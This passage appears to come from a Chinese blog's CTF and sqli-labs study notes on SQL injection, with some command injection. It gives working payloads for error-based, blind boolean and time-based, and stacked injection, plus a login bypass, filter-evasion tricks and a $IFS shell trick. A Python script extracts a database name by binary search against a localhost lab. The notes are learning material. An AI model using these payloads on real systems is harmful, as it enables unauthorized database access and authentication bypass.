&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; updatexml(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,concat(&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;,(&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; (group_concat(flag)) &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; sqli.flag ),&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;长度限制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#长度限制&#34;&gt;#&lt;/a&gt; 长度限制&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;limit：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; and updatexml(1,concat(0x7e,(select user from mysql.user limit 1,1)),3) -- a	//limit 0,1为展示第0条数据&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;substr():&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; and updatexml(1,concat(0x7e,substr((select group_concat(user)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from mysql.user), 1 , 31)),3) -- a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;布尔盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#布尔盲注&#34;&gt;#&lt;/a&gt; 布尔盲注&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;特征：&lt;br&gt;
1. 没有报错信息&lt;br&gt;
 2. 不管是正确的输入，还是错误的输入，都只显示两种情况 (我们可以认为是 0 或者 1)&lt;br&gt;
 3. 在正确的输入下，输入 and 1=1/and 1= 2 发现可以判断&lt;br&gt;
 4. 步骤：&lt;/li&gt;
&lt;li&gt;用？id=1’ and 1=1–+ 和？id=1’ and 1=2–+ 验证&lt;/li&gt;
&lt;li&gt;获取长度&lt;/li&gt;
&lt;li&gt;一个一个猜测 flag 的内容：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;((&lt;span class=&#34;built_in&#34;&gt;ascii&lt;/span&gt;(substr((select(flag)&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt;(flag)),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))=&lt;span class=&#34;number&#34;&gt;102&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;if () 第一个参数为真，则返回 1，假则返回 0&lt;br&gt;
substr (a,1,1) 表示从第一个字符开始，截取一个字符&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;其他可用函数：&lt;br&gt;
left()：&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;left(database(),1)  //前8个字符&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;mid()&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;2 分法脚本：&lt;/p&gt;
&lt;p&gt;ascii () 参数是布尔值则返回 true 或 false&lt;/p&gt;
&lt;p&gt;一下示例为获取数据库名&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://localhost/sqli-labs-master/Less-8/?id=1&amp;#x27;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_dbname&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    db_name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 这个遍历是数据库名字的长度如果不够的话就一点一点猜测&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        low = &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        high = &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (low &amp;lt; high):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# 32~127是ascii值对应的字符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;and ascii(substr(database(),%d,1))&amp;gt;%d --+&amp;quot;&lt;/span&gt; % (i, mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            url1 = url + payload        &lt;span class=&#34;comment&#34;&gt;# 获取url（原url+sql语句构造的url）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            res = requests.get(url1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;You are in...........&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; res.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                low = mid + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                high = mid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (mid == &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; mid == &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        db_name += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;数据库名称为:&amp;quot;&lt;/span&gt; + db_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;get_dbname()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;没过滤和单引号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#没过滤和单引号&#34;&gt;#&lt;/a&gt; 没过滤 | 和单引号’&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;playload：用户名是字符串，要用’&#39; 包起来&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;post:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=&amp;quot;&amp;#x27;||substr(p,&amp;#123;&amp;#125;,1)&amp;lt;&amp;#x27;&amp;#123;&amp;#125;&amp;quot;.format(i,mid)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;时间盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#时间盲注&#34;&gt;#&lt;/a&gt; 时间盲注&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;判断时间盲注：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and sleep(3) --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;6数据不在数据库中&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6数据不在数据库中&#34;&gt;#&lt;/a&gt; 6. 数据不在数据库中&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;知道字段数量为2后，可以查看数据库位置，使用union select 1,2查看未发现数据&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;修改id=0或id=-1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;使用 if () 语句，若条件正确则有明显延迟&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;7cookie注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7cookie注入&#34;&gt;#&lt;/a&gt; 7.cookie 注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;使用 burpsuite&lt;/li&gt;
&lt;li&gt;&lt;code&gt;refer注入：直接在请求中写入**referer:**&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http refer: HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;8堆叠注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8堆叠注入&#34;&gt;#&lt;/a&gt; 8. 堆叠注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;使用情况：过滤了 select&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;基本语法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#基本语法&#34;&gt;#&lt;/a&gt; 基本语法：&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&amp;#x27;;show databases;#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&amp;#x27;;show tables;#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&amp;#x27;;show columns from words;#		&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&amp;#x27;;show columns from `1919810931114514`;#   // (字符串为表名操作时要加反引号)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;输入：&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;1’ union select 1,2#&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;发现过滤 select，堆叠注入。以下为 show 函数用法：&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;show databases// 列出服务器可访问的数据库&lt;br&gt;
 show tables// 显示该数据库内相关表的名称&lt;br&gt;
 show columns from tablename；// 显示表 tablename 的字段、字段类型、键值信息、是否可以用 null、默认值及其他信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;表名为数字时要用反引号括起来&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;爆出字段名后&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#爆出字段名后&#34;&gt;#&lt;/a&gt; 爆出字段名后&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;将：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select * from`1919810931114514`&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;进行 16 进制编码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;构造 playload：&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;prepare…from… 是预处理语句，会进行编码转换。&lt;/li&gt;
&lt;li&gt;execute 用来执行由 SQLPrepare 创建的 SQL 语句。&lt;/li&gt;
&lt;li&gt;SELECT 可以在一条语句里对多个变量同时赋值，而 SET 只能一次对一个变量赋值。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;将@a赋值为16进制编码后的语句，再将@a中的语句转换后给execsqp，执行execsql中的语句&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;handler语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#handler语句&#34;&gt;#&lt;/a&gt; handler 语句&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;handler 是 mysql 的专用语句，没有包含到 SQL 标准中，但它每次只能查询 1 次记录，而 select 可以根据需要返回多条查询结果。&lt;br&gt;
hander  &lt;code&gt;表名&lt;/code&gt;  open;           // 打开一个表&lt;br&gt;
 handler &lt;code&gt;表名&lt;/code&gt;  read frist;      // 查询第一个数据&lt;br&gt;
 handler &lt;code&gt;表名&lt;/code&gt;  read next;     // 查询之后的数据直到最后一个数据返回空&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;handler`1919810931114514` open;handler`1919810931114514`read next;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;9万能密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#9万能密码&#34;&gt;#&lt;/a&gt; 9. 万能密码:&lt;/h2&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;admin&lt;span class=&#34;string&#34;&gt;&amp;#x27;or&amp;#x27;&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;&amp;amp;&lt;/span&gt;password&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;admin&lt;span class=&#34;string&#34;&gt;&amp;#x27;or&amp;#x27;&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;输入账号密码&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; t_user &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;AND&lt;/span&gt; password &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxxx&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;用 or 1=1 使 where 条件恒为 true&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤&#34;&gt;#&lt;/a&gt; 过滤&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;过滤空格，{}：$IFS&lt;/li&gt;
&lt;li&gt;过滤 flag：&lt;/li&gt;
&lt;li&gt;将关键字 replace 为空格，使用双写绕过&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat$IFS$9`ls` //`ls`可以输出查询结果的内容&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;双写绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#双写绕过&#34;&gt;#&lt;/a&gt; 双写绕过：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;playload:(check.php)?username=‘oorr 1=1%23&amp;amp;password=’&lt;br&gt;
 &lt;code&gt;%23为注释，注释掉后面的password，因此password可以随便写;注意先单引号闭合&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;10post注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#10post注入&#34;&gt;#&lt;/a&gt; 10.post 注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;常产生地方：登录框（less-11）&lt;/li&gt;
&lt;li&gt;数据包提交方式为 post&lt;/li&gt;
&lt;li&gt;此处注释用 #或者–&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;信息搜集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息搜集&#34;&gt;#&lt;/a&gt; 信息搜集&lt;/h2&gt;
&lt;blockquote&gt;
